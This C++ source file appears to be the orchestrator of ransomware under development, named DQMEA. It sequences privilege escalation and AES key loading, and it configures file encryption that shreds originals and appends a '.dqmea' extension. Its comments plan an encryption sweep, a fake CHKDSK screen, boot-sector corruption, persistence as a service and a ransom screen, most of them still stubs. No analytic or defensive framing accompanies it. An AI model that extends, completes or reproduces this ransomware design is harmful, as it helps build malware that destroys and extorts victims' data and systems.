// orchestrator.cpp — Main phase sequencing
#include "orchestrator.h"
#include "util/filesystem.h"
#include "crypto/keyvault.h"
#include "encryptor/encryptor.h"
#include "encryptor/walker.h"

#include <thread>
#include <chrono>

namespace orchestrator {

std::atomic<bool> g_abort{false};

int run() {
    // 1. Enable privileges
    util::enable_privileges();

    // 2. Load config / KeyVault
    // For this skeleton, we create a dummy vault in memory.
    crypto::KeyVault vault;
    vault.create(128);
    // (In reality, load from DQMEA_VAULT_PATH)
    // vault.load(DQMEA_VAULT_PATH);

    if (vault.count() == 0) return 1;

    // 3. Initialize encryption engine (use key 0 for now)
    encryptor::EncryptConfig cfg;
    cfg.aes_key = vault.aes_key(0);
    cfg.shred_original = true;
    cfg.append_ext = true;
    cfg.extension = L".dqmea";
    encryptor::init_encryption(cfg);

    // 4. Start fake CHKDSK screen (stub for now — will be src/ui/chkdsk.cpp)
    // show_chkdsk_screen();

    // 5. Run Encryption Sweep
    // In a real scenario, this runs in background threads.
    // Here, we run it synchronously to test the pipeline.
    
    // std::atomic<bool> encrypt_abort{false};
    // encryptor::run_encryption_sweep(encrypt_abort);

    // 6. Corrupt MBR / winload (stub for now)
    // corrupt_boot_sector();

    // 7. Register Persistence (stub for now)
    // install_service();

    // 8. Spawn Ransom Screen (stub for now)
    // spawn_ransom_screen();

    // For now, just show a message box to confirm the binary works
    MessageBoxW(NULL, L"DQMEA: Core pipeline compiled and reached.",
                L"DQMEA", MB_OK | MB_ICONWARNING);

    return 0;
}

} // namespace orchestrator
